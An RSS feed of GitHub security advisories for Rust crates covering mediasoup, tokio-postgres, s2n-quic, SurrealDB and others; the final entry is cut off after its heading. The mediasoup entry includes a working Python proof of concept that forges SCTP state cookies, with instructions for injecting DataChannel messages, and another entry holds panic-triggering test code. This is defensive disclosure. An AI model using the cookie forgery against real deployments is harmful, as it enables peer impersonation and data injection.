<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/rust.rss</id>
    <title>Security Advisory for Rust crates</title>
    <updated>2026-08-26T03:42:59.749Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Arust"/>
    <subtitle>Security Advisory for Rust crates on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[mediasoup] mediasoup: SCTP state cookie lacks cryptographic authentication, enabling unauthorized association establishment (RFC 9260 violation)]]></title>
        <id>https://github.com/advisories/GHSA-p7x2-g5cq-fhmq</id>
        <link href="https://github.com/advisories/GHSA-p7x2-g5cq-fhmq"/>
        <updated>2026-08-25T18:17:23.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>mediasoup's built-in SCTP stack (introduced in v3.20.0) authenticates SCTP state cookies using only hardcoded magic byte sequences rather than a per-instance HMAC keyed with a secret, violating RFC 9260 Section 5.1.3. An on-path attacker targeting a PlainTransport with SCTP enabled (and no SRTP/DTLS protection) can craft a forged COOKIE-ECHO chunk that passes all validation, establishing an unauthorized SCTP association and gaining the ability to inject DataChannel messages as a trusted peer.</p>
<h3 id="details">Details</h3>
<p>RFC 9260 Section 5.1.3 states: "An endpoint MUST use a one-time-use secret key to protect the State Cookie." The mediasoup implementation ignores this requirement. The state cookie is defined in <code>worker/include/RTC/SCTP/association/StateCookie.hpp</code> with the following structure (44 bytes total):</p>
<ul>
<li>Offset 0: Magic1 = <code>"msworker"</code> (hardcoded, 8 bytes)</li>
<li>Offset 8: localVerificationTag (4 bytes, attacker-controlled)</li>
<li>Offset 12: remoteVerificationTag (4 bytes, attacker-controlled)</li>
<li>Offset 16-27: TSN and window fields (attacker-controlled)</li>
<li>Offset 28: tieTag (8 bytes, attacker-controlled)</li>
<li>Offset 36: NegotiatedCapabilitiesField containing Magic2 = <code>0xAD81</code> (hardcoded)</li>
</ul>
<p>The validation function <code>StateCookie::IsMediasoupStateCookie()</code> in <code>worker/src/RTC/SCTP/association/StateCookie.cpp</code> only checks:</p>
<ol>
<li><code>bufferLength == 44</code></li>
<li><code>bytes[0:8] == "msworker"</code> (Magic1, always the same)</li>
<li><code>ntohs(bytes[38:40]) == 0xAD81</code> (Magic2, always the same)</li>
</ol>
<p>No HMAC, no per-session secret, no nonce. All "magic" values are published constants in the public header.</p>
<p>When a COOKIE-ECHO is received in <code>Association::HandleReceivedCookieEchoChunk()</code> (without an existing TCB), the sole security check is:</p>
<pre><code class="language-cpp">if (receivedPacket-&gt;GetVerificationTag() != cookie-&gt;GetLocalVerificationTag())
</code></pre>
<p>Because the attacker controls both the SCTP packet header's verification tag field AND the <code>localVerificationTag</code> field inside their crafted cookie, this check is trivially satisfied by setting both to the same attacker-chosen value.</p>
<p>Additionally, <code>Association::ValidateReceivedPacket()</code> explicitly skips verification-tag validation for COOKIE-ECHO packets (line 1153 in Association.cpp), and the SCTP CRC32c checksum function <code>Packet::ValidateCRC32cChecksum()</code> exists but is never called in the packet-reception path, so a forged packet with any checksum is accepted.</p>
<p>This vulnerability affects <code>PlainTransport</code> with SCTP enabled when used without SRTP (SRTP is optional via <code>srtpCryptoSuite</code> parameter). <code>WebRtcTransport</code> is NOT affected because its SCTP runs inside a DTLS session. <code>comedia</code> mode (default: false) increases exposure by accepting packets from any source IP.</p>
<h3 id="poc">PoC</h3>
<p>Prerequisites: mediasoup server running with a PlainTransport that has SCTP enabled and no SRTP (<code>srtpCryptoSuite</code> not set). The server's UDP IP:port must be reachable.</p>
<p>The following Python script constructs and validates a forged SCTP state cookie that passes all mediasoup validation checks:</p>
<pre><code class="language-python">#!/usr/bin/env python3
"""
Proof-of-concept: mediasoup SCTP state cookie forgery
Demonstrates that IsMediasoupStateCookie() accepts a fully attacker-crafted cookie.
Requires: struct (stdlib only)

Usage: python3 poc_cookie_forge.py
"""
import struct

# Attacker-chosen values -- all arbitrary
LOCAL_VT  = 0xDEADBEEF  # Will be put in SCTP packet's Verification Tag field
REMOTE_VT = 0xCAFEBABE
LOCAL_TSN = 1000
REMOTE_TSN = 2000
RWND = 65535
TIE_TAG = 0

# Build a 44-byte state cookie matching mediasoup's StateCookie layout
cookie = bytearray(44)

# Offset 0: Magic1 = "msworker" (0x6D73776F726B6572)
cookie[0:8] = b'msworker'

# Offset 8: localVerificationTag (big-endian)
struct.pack_into('&gt;I', cookie, 8, LOCAL_VT)

# Offset 12: remoteVerificationTag
struct.pack_into('&gt;I', cookie, 12, REMOTE_VT)

# Offset 16: localInitialTsn
struct.pack_into('&gt;I', cookie, 16, LOCAL_TSN)

# Offset 20: remoteInitialTsn
struct.pack_into('&gt;I', cookie, 20, REMOTE_TSN)

# Offset 24: remoteAdvertisedReceiverWindowCredit
struct.pack_into('&gt;I', cookie, 24, RWND)

# Offset 28: tieTag (8 bytes)
struct.pack_into('&gt;Q', cookie, 28, TIE_TAG)

# Offset 36: NegotiatedCapabilitiesField
# [36]: reserved = 0
# [37]: bits (ABCD flags) = 0
# [38:40]: Magic2 = 0xAD81 (network byte order)
# [40:42]: max outbound streams
# [42:44]: max inbound streams
cookie[36] = 0       # reserved
cookie[37] = 0       # bits
struct.pack_into('&gt;H', cookie, 38, 0xAD81)   # Magic2
struct.pack_into('&gt;H', cookie, 40, 1024)      # maxOutboundStreams
struct.pack_into('&gt;H', cookie, 42, 1024)      # maxInboundStreams

# Reproduce StateCookie::IsMediasoupStateCookie() logic:
def is_mediasoup_state_cookie(buf):
    if len(buf) != 44:
        return False
    if buf[0:8] != b'msworker':
        return False
    magic2 = struct.unpack('&gt;H', buf[38:40])[0]
    if magic2 != 0xAD81:
        return False
    return True

assert is_mediasoup_state_cookie(cookie), "Cookie rejected - BUG in PoC"

# Reproduce HandleReceivedCookieEchoChunk validation (no TCB path):
# receivedPacket-&gt;GetVerificationTag() == cookie-&gt;GetLocalVerificationTag()
packet_vt    = LOCAL_VT
cookie_local_vt = struct.unpack('&gt;I', cookie[8:12])[0]
auth_passes = (packet_vt == cookie_local_vt)

print("=== mediasoup SCTP State Cookie Forgery PoC ===")
print(f"Forged cookie (hex): {cookie.hex()}")
print(f"IsMediasoupStateCookie(): {is_mediasoup_state_cookie(cookie)}")
print(f"localVerificationTag in cookie: {cookie_local_vt:#010x}")
print(f"SCTP packet verificationTag:    {packet_vt:#010x}")
print(f"HandleReceivedCookieEchoChunk auth check passes: {auth_passes}")
print()
print("Result: COOKIE-ECHO accepted -&gt; SCTP association ESTABLISHED without 4-way handshake")
print("Next step: attacker sends DATA chunks to inject DataChannel messages")
</code></pre>
<p>Observed output when run:</p>
<pre><code>=== mediasoup SCTP State Cookie Forgery PoC ===
Forged cookie (hex): 6d73776f726b6572deadbeefcafebabe000003e8000007d00000ffff00000000000000000000ad8104000400
IsMediasoupStateCookie(): True
localVerificationTag in cookie: 0xdeadbeef
SCTP packet verificationTag:    0xdeadbeef
HandleReceivedCookieEchoChunk auth check passes: True

Result: COOKIE-ECHO accepted -&gt; SCTP association ESTABLISHED without 4-way handshake
Next step: attacker sends DATA chunks to inject DataChannel messages
</code></pre>
<p>To forge the full SCTP packet on the network: wrap the 44-byte cookie in a COOKIE-ECHO chunk (type=0x0A), set the SCTP common header's Verification Tag to <code>LOCAL_VT</code>, compute a valid CRC32c checksum (or any value - the checksum is never verified on receive), and send the UDP packet from the permitted source address (or any source if <code>comedia=true</code>).</p>
<h3 id="impact">Impact</h3>
<p>Any mediasoup deployment using <code>PlainTransport</code> with SCTP enabled and no SRTP is affected when an attacker occupies a network position where they can send UDP packets from the transport's configured peer address (or when <code>comedia</code> mode is enabled). The attacker can skip the standard SCTP 4-way handshake entirely and directly send a forged COOKIE-ECHO to establish an association, then inject arbitrary DataChannel messages as if they were the trusted peer. This can cause data integrity violations in server-to-server SCTP channels (e.g., SFU interconnects) or enable denial of service by preempting the legitimate peer's association.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/versatica/mediasoup/security/advisories/GHSA-p7x2-g5cq-fhmq">https://github.com/versatica/mediasoup/security/advisories/GHSA-p7x2-g5cq-fhmq</a></li>
<li><a href="https://github.com/versatica/mediasoup/pull/1829">https://github.com/versatica/mediasoup/pull/1829</a></li>
<li><a href="https://github.com/versatica/mediasoup/commit/9c1a90a8f9206b965e727d134846fb42df4980a7">https://github.com/versatica/mediasoup/commit/9c1a90a8f9206b965e727d134846fb42df4980a7</a></li>
<li><a href="https://github.com/versatica/mediasoup/releases/tag/3.20.6">https://github.com/versatica/mediasoup/releases/tag/3.20.6</a></li>
<li><a href="https://github.com/advisories/GHSA-p7x2-g5cq-fhmq">https://github.com/advisories/GHSA-p7x2-g5cq-fhmq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p7x2-g5cq-fhmq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-25T18:17:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vibeio-http] vibeio-http has a DoS vulnerability in HTTP/1.x chunked encoding parser triggered by maliciously crafted chunk lengths]]></title>
        <id>https://github.com/advisories/GHSA-fx4f-mhw4-qm7j</id>
        <link href="https://github.com/advisories/GHSA-fx4f-mhw4-qm7j"/>
        <updated>2026-08-24T22:05:06.000Z</updated>
        <content type="html"><![CDATA[<p>When using the affected versions of the <code>vibeio-http</code> crate, an attacker could craft a malicious HTTP/1.x request with a large chunk length (between <code>usize::MAX - 1</code> and <code>usize::MAX</code> inclusive) and send it, causing the server to crash (integer overflow panic in debug builds, split_to out of bounds panic in release builds).</p>
<p>This was fixed in <code>vibeio-http</code> 0.3.2 by erroring on the chunk length if it exceeds <code>usize::MAX - 2</code> (using <code>checked_add()</code> instead of <code>+</code> operator), preventing integer overflow.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ferronweb/vibeio-http/blob/main/CHANGELOG.md#vibeio-http-032">https://github.com/ferronweb/vibeio-http/blob/main/CHANGELOG.md#vibeio-http-032</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2026-0181.html">https://rustsec.org/advisories/RUSTSEC-2026-0181.html</a></li>
<li><a href="https://github.com/advisories/GHSA-fx4f-mhw4-qm7j">https://github.com/advisories/GHSA-fx4f-mhw4-qm7j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fx4f-mhw4-qm7j</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-24T22:05:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tokio-postgres] tokio-postgres: Panic on a `DataRow` with fewer fields than columns allows denial of service]]></title>
        <id>https://github.com/advisories/GHSA-3gjw-f78c-vvpw</id>
        <link href="https://github.com/advisories/GHSA-3gjw-f78c-vvpw"/>
        <updated>2026-08-24T19:49:17.000Z</updated>
        <content type="html"><![CDATA[<p>A malicious or compromised server can send a row containing fewer fields than
its row description declares columns. Reading one of the missing columns then
panics with an out-of-bounds index, aborting the calling task. This affects even
the otherwise non-panicking <code>try_get</code>, and both <code>Row</code> and <code>SimpleQueryRow</code>.</p>
<p>Applications that connect only to a trusted database are not exposed; the risk
applies to clients that may connect to untrusted or user-supplied servers, or
whose connection can be intercepted by a man-in-the-middle.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/rust-postgres/rust-postgres/commit/7a00ffa9ad4d951ec0a4564b52f1780fa9d353c1">https://github.com/rust-postgres/rust-postgres/commit/7a00ffa9ad4d951ec0a4564b52f1780fa9d353c1</a></li>
<li><a href="https://github.com/rust-postgres/rust-postgres/releases/tag/tokio-postgres-v0.7.18">https://github.com/rust-postgres/rust-postgres/releases/tag/tokio-postgres-v0.7.18</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2026-0178.html">https://rustsec.org/advisories/RUSTSEC-2026-0178.html</a></li>
<li><a href="https://github.com/advisories/GHSA-3gjw-f78c-vvpw">https://github.com/advisories/GHSA-3gjw-f78c-vvpw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3gjw-f78c-vvpw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-24T19:49:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[postgres-protocol] postgres-protocol: Panic decoding a malformed `hstore` value allows denial of service]]></title>
        <id>https://github.com/advisories/GHSA-rgqc-3x5p-6gwg</id>
        <link href="https://github.com/advisories/GHSA-rgqc-3x5p-6gwg"/>
        <updated>2026-08-24T19:47:52.000Z</updated>
        <content type="html"><![CDATA[<p>A malicious or compromised server can return a binary <code>hstore</code> value with an
invalid internal length field, causing the client to panic while decoding it.</p>
<p>Applications that connect only to a trusted database are not exposed; the risk
applies to clients that may connect to untrusted or user-supplied servers, or
whose connection can be intercepted by a man-in-the-middle.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/rust-postgres/rust-postgres/commit/a7cf84b5c46431cbca9d8ff50508c23f446efa7d">https://github.com/rust-postgres/rust-postgres/commit/a7cf84b5c46431cbca9d8ff50508c23f446efa7d</a></li>
<li><a href="https://github.com/rust-postgres/rust-postgres/releases/tag/postgres-protocol-v0.6.12">https://github.com/rust-postgres/rust-postgres/releases/tag/postgres-protocol-v0.6.12</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2026-0180.html">https://rustsec.org/advisories/RUSTSEC-2026-0180.html</a></li>
<li><a href="https://github.com/advisories/GHSA-rgqc-3x5p-6gwg">https://github.com/advisories/GHSA-rgqc-3x5p-6gwg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rgqc-3x5p-6gwg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-24T19:47:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[postgres-protocol] postgres-protocol: Unbounded SCRAM iteration count allows a malicious server to cause CPU-exhaustion denial of service]]></title>
        <id>https://github.com/advisories/GHSA-5x78-73v4-xg6w</id>
        <link href="https://github.com/advisories/GHSA-5x78-73v4-xg6w"/>
        <updated>2026-08-24T19:43:32.000Z</updated>
        <content type="html"><![CDATA[<p>A malicious, compromised, or man-in-the-middle server can supply an arbitrarily
large SCRAM-SHA-256 PBKDF2 iteration count during authentication. The client
runs it inline with no upper bound, pinning a <code>tokio</code> worker thread for minutes
per connection, possibly stalling the whole async runtime.</p>
<p>Applications that connect only to a trusted database are not exposed; the risk
applies to clients that may connect to untrusted or user-supplied servers, or
whose connection can be intercepted by a man-in-the-middle.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/rust-postgres/rust-postgres/commit/d40097a36a85068ea50a3afbf0ce154ba439e7f0">https://github.com/rust-postgres/rust-postgres/commit/d40097a36a85068ea50a3afbf0ce154ba439e7f0</a></li>
<li><a href="https://github.com/rust-postgres/rust-postgres/releases/tag/postgres-protocol-v0.6.12">https://github.com/rust-postgres/rust-postgres/releases/tag/postgres-protocol-v0.6.12</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2026-0179.html">https://rustsec.org/advisories/RUSTSEC-2026-0179.html</a></li>
<li><a href="https://github.com/advisories/GHSA-5x78-73v4-xg6w">https://github.com/advisories/GHSA-5x78-73v4-xg6w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5x78-73v4-xg6w</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-24T19:43:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[kcl-lib] Zoo Design Studio: Memory-corruption in memory handling of lib-kcl]]></title>
        <id>https://github.com/advisories/GHSA-mc9m-6fm9-pghc</id>
        <link href="https://github.com/advisories/GHSA-mc9m-6fm9-pghc"/>
        <updated>2026-08-20T18:34:13.000Z</updated>
        <content type="html"><![CDATA[<p>A race condition in kcl-lib can result in a use-after-free when accessing environments concurrently. During Vec reallocation, the previous buffer containing Box pointers is freed and replaced. A concurrent get_env operation that has already loaded a pointer to the old buffer may subsequently index into freed memory and retrieve a stale or corrupted Pin&lt;Box&gt;.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/KittyCAD/modeling-app/security/advisories/GHSA-mc9m-6fm9-pghc">https://github.com/KittyCAD/modeling-app/security/advisories/GHSA-mc9m-6fm9-pghc</a></li>
<li><a href="https://github.com/advisories/GHSA-mc9m-6fm9-pghc">https://github.com/advisories/GHSA-mc9m-6fm9-pghc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mc9m-6fm9-pghc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-20T18:34:11.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[kcl-lib] Zoo Design Studio: Recursive KCL parsing is vulnerable to denial-of-service]]></title>
        <id>https://github.com/advisories/GHSA-jgvr-6x5w-hx5w</id>
        <link href="https://github.com/advisories/GHSA-jgvr-6x5w-hx5w"/>
        <updated>2026-08-20T18:34:07.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Feeding a KCL program that wraps an expression in deep, unnecessary parentheses triggers the parser’s recursive <code>expression</code> -&gt; <code>unnecessarily_bracketed</code> -&gt; <code>expression</code> path. With enough nesting, the call stack grows until it exceeds the process stack limit, causing a stack overflow.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/KittyCAD/modeling-app/security/advisories/GHSA-jgvr-6x5w-hx5w">https://github.com/KittyCAD/modeling-app/security/advisories/GHSA-jgvr-6x5w-hx5w</a></li>
<li><a href="https://github.com/advisories/GHSA-jgvr-6x5w-hx5w">https://github.com/advisories/GHSA-jgvr-6x5w-hx5w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jgvr-6x5w-hx5w</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-20T18:34:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[block_buffer] block_buffer: panic corrupts inline buffer position]]></title>
        <id>https://github.com/advisories/GHSA-qwgh-2vcv-g2f7</id>
        <link href="https://github.com/advisories/GHSA-qwgh-2vcv-g2f7"/>
        <updated>2026-08-19T19:15:35.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A caught panic may leave the cursor position of <code>EagerBuffer</code> or <code>ReadBuffer</code> in a corrupted state; this in turn allows out-of-bounds reads/writes.</p>
<h3 id="details--poc">Details &amp; PoC</h3>
<p>The following two tests fail miri:</p>
<pre><code class="language-rust">#[cfg(miri)]
#[test]
fn eager_digest_blocks_panic_corrupts_inline_position() {
    // `EagerBuffer` stores its cursor in the last byte of the internal block.
    // When `digest_blocks` completes a previously partial block, it overwrites
    // that byte with input data before invoking the caller-provided `compress`
    // callback. If the callback panics, safe code can catch the panic and keep
    // using the buffer while its cursor byte no longer satisfies the internal
    // `pos &lt; block_size` invariant. Under Miri this `get_pos` call reaches the
    // `unreachable_unchecked` used for the assumed-valid cursor.
    let mut buf = EagerBuffer::&lt;U4&gt;::new(&amp;[1, 2]);

    let _ = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
        buf.digest_blocks(&amp;[3, 0xff], |_| panic!("simulated compression failure"));
    }));

    let _ = buf.get_pos();
}

#[cfg(miri)]
#[test]
fn read_buffer_generator_panic_corrupts_inline_position() {
    // `ReadBuffer` stores its cursor in `buffer[0]`, but `write_block` gives
    // `gen_block` mutable access to the whole internal block before restoring
    // `buffer[0]` to a valid cursor. If `gen_block` writes an arbitrary first
    // byte and panics, safe code can catch the panic and later observe an
    // invalid cursor. Under Miri this `get_pos` call reaches the
    // `unreachable_unchecked` used for the assumed-valid cursor.
    let mut buf = ReadBuffer::&lt;U4&gt;::default();

    let _ = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
        buf.write_block(
            1,
            |block| {
                block[0] = 0xff;
                panic!("simulated block generation failure");
            },
            |_| {},
        );
    }));

    let _ = buf.get_pos();
}
</code></pre>
<p>They fail on an <code>unreachable_unchecked!()</code> under the invariant for the <code>pos</code> to always be within bounds of the block.</p>
<h3 id="impact">Impact</h3>
<p>While the byte that overwrites <code>pos</code> may come from untrusted input and is therefore attacker-controlled, this still relies on the surrounding code catching the panic and carrying on, which should be uncommon in practice.</p>
<p>For this to be exploitable, the attacker also needs a way to trigger a panic here; I have not investigated how feasible that is.</p>
<h3 id="credits">Credits</h3>
<p>The issue was discovered by GPT-5.5</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/RustCrypto/utils/security/advisories/GHSA-qwgh-2vcv-g2f7">https://github.com/RustCrypto/utils/security/advisories/GHSA-qwgh-2vcv-g2f7</a></li>
<li><a href="https://github.com/RustCrypto/utils/releases/tag/block-buffer-v0.12.1">https://github.com/RustCrypto/utils/releases/tag/block-buffer-v0.12.1</a></li>
<li><a href="https://github.com/advisories/GHSA-qwgh-2vcv-g2f7">https://github.com/advisories/GHSA-qwgh-2vcv-g2f7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qwgh-2vcv-g2f7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-19T19:15:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[triton-vm] Triton VM Soundness Vulnerability due to Missing Constraint]]></title>
        <id>https://github.com/advisories/GHSA-vjf8-9fx6-mv6x</id>
        <link href="https://github.com/advisories/GHSA-vjf8-9fx6-mv6x"/>
        <updated>2026-08-18T20:22:22.000Z</updated>
        <content type="html"><![CDATA[<p>The instruction <code>sponge_absorb_mem</code> Triton VM fails to verify that hashed values come from the claimed memory location. Malicious provers can substitute arbitrary data instead of actual memory contents.</p>
<p>Any application using instruction <code>sponge_absorb_mem</code> to hash memory data can be given a proof for a forged hash that doesn't correspond to the actual memory. This breaks the security of memory-based commitments.</p>
<p>The flaw was corrected in commits <code>17c7ba0a</code> and <code>ef9d9e72</code> by including the appropriate constraints.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/TritonVM/triton-vm/commit/17c7ba0a19f31793f1c807a58afaf9504342aac5">https://github.com/TritonVM/triton-vm/commit/17c7ba0a19f31793f1c807a58afaf9504342aac5</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2021-0156.html">https://rustsec.org/advisories/RUSTSEC-2021-0156.html</a></li>
<li><a href="https://github.com/advisories/GHSA-vjf8-9fx6-mv6x">https://github.com/advisories/GHSA-vjf8-9fx6-mv6x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vjf8-9fx6-mv6x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-18T20:22:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[s2n-quic] s2n-quic has excessive memory allocation]]></title>
        <id>https://github.com/advisories/GHSA-9q54-f358-3fqf</id>
        <link href="https://github.com/advisories/GHSA-9q54-f358-3fqf"/>
        <updated>2026-08-14T21:44:21.000Z</updated>
        <content type="html"><![CDATA[<p>s2n-quic is a Rust implementation of the QUIC protocol. An unauthenticated user can attempt to exhaust server memory on an s2n-quic endpoint by sending crafted CRYPTO frames with high offsets. The buffer used for processing CRYPTO frames does not enforce a maximum size. In the worst case, a single 1200-byte packet can cause approximately 9.4 MB of allocation. By repeatedly sending such packets, the resulting memory pressure could cause denial of service. No valid handshake is required.</p>
<p>Impacted versions: &lt;= v1.81.0</p>
<h3 id="patches">Patches</h3>
<p>This issue has been addressed in s2n-quic version v1.82.0. We recommend upgrading to the latest version and ensuring any forked or derivative code is patched to incorporate the new fixes.&nbsp;</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no workaround that fully mitigates this issue. Upgrading to the patched version is the recommended remediation.</p>
<h3 id="references">References</h3>
<p>If there are any questions or comments about this advisory, contact AWS Security via the <a href="https://aws.amazon.com/security/vulnerability-reporting">vulnerability reporting page</a> or directly via email to <a href="mailto:aws-security@amazon.com">aws-security@amazon.com</a>. Please do not create a public GitHub issue.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/aws/s2n-quic/security/advisories/GHSA-9q54-f358-3fqf">https://github.com/aws/s2n-quic/security/advisories/GHSA-9q54-f358-3fqf</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-10740">https://nvd.nist.gov/vuln/detail/CVE-2026-10740</a></li>
<li><a href="https://aws.amazon.com/security/security-bulletins/2026-042-aws">https://aws.amazon.com/security/security-bulletins/2026-042-aws</a></li>
<li><a href="https://github.com/aws/s2n-quic/releases/tag/v1.82.0">https://github.com/aws/s2n-quic/releases/tag/v1.82.0</a></li>
<li><a href="https://github.com/advisories/GHSA-9q54-f358-3fqf">https://github.com/advisories/GHSA-9q54-f358-3fqf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9q54-f358-3fqf</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-14T21:44:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[surrealdb] SurrealDB: Array element-level (field.*) SELECT permissions leak denied elements to record users]]></title>
        <id>https://github.com/advisories/GHSA-8rw6-p7m8-63jp</id>
        <link href="https://github.com/advisories/GHSA-8rw6-p7m8-63jp"/>
        <updated>2026-08-14T19:40:48.000Z</updated>
        <content type="html"><![CDATA[<p>A <code>SELECT</code> permission defined on an array element (<code>DEFINE FIELD field.* … PERMISSIONS FOR select …</code>) is not enforced correctly for <code>RECORD</code> users. Instead of hiding the denied elements, the query leaks a subset of them: a deny-all returns the odd-indexed elements, and a per-element predicate keeps and drops the wrong ones.</p>
<p>The filter removed each denied element by index while walking the array forwards. Because removing an element shifts every later index down, each cut invalidated the indices still pending in the loop, leaving denied elements behind. Field-level permissions are enforced correctly; only the element (<code>field.*</code>) level is affected, and only for record users — root and record-owner sessions are not.</p>
<h2 id="impact">Impact</h2>
<p>What an attacker <strong>can</strong> do:</p>
<ul>
<li>As a record (scope) user, read array elements that an element-level (<code>field.*</code>) SELECT permission should hide, on any table they can already SELECT.</li>
<li>Recover denied elements through both a deny-all and a <code>WHERE</code> predicate — the wrong elements are selected either way.</li>
</ul>
<p>What it <strong>can't</strong> do:</p>
<ul>
<li>Bypass field-level SELECT permissions, which are evaluated correctly.</li>
<li>Affect root or record-owner sessions, or cross namespace/database isolation.</li>
<li>Modify data, escalate privileges, or affect availability (confidentiality only).</li>
</ul>
<h2 id="patches">Patches</h2>
<p>The three permission-filtering paths (<code>doc/reduce.rs</code>, <code>doc/output.rs</code>, <code>exec/operators/scan/pipeline.rs</code>) now remove denied elements in reverse index order, so removing one element no longer shifts the elements still to be checked. Regression tests reproducing the issue were added.</p>
<p>The fix is included in SurrealDB 3.1.4.</p>
<h2 id="workarounds">Workarounds</h2>
<ul>
<li>Do not rely on element-level (<code>field.*</code>) permissions to hide data from record users; use field-level permissions, which are enforced correctly.</li>
<li>Restrict record users from selecting tables whose schema uses element-level permissions.</li>
</ul>
<h2 id="resources">Resources</h2>
<ul>
<li><a href="https://surrealdb.com/docs/surrealql/statements/define/field">DEFINE FIELD</a></li>
<li><a href="https://surrealdb.com/docs/learn/security/authentication/authentication">USERS</a></li>
<li><a href="https://surrealdb.com/docs/surrealql/statements/define/table">DEFINE TABLE … PERMISSIONS</a></li>
<li><code>fix(sec): stop array element-level SELECT permissions leaking elements</code> (commit <code>8f89b260b</code>)</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/surrealdb/surrealdb/security/advisories/GHSA-8rw6-p7m8-63jp">https://github.com/surrealdb/surrealdb/security/advisories/GHSA-8rw6-p7m8-63jp</a></li>
<li><a href="https://github.com/surrealdb/surrealdb/commit/8f89b260bb9692e5b0d58930793d482a8207eedc">https://github.com/surrealdb/surrealdb/commit/8f89b260bb9692e5b0d58930793d482a8207eedc</a></li>
<li><a href="https://github.com/advisories/GHSA-8rw6-p7m8-63jp">https://github.com/advisories/GHSA-8rw6-p7m8-63jp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8rw6-p7m8-63jp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-14T19:40:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nimiq-blockchain] nimiq-blockchain: Validity store off by one error]]></title>
        <id>https://github.com/advisories/GHSA-3763-qp59-59vf</id>
        <link href="https://github.com/advisories/GHSA-3763-qp59-59vf"/>
        <updated>2026-08-12T15:16:54.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
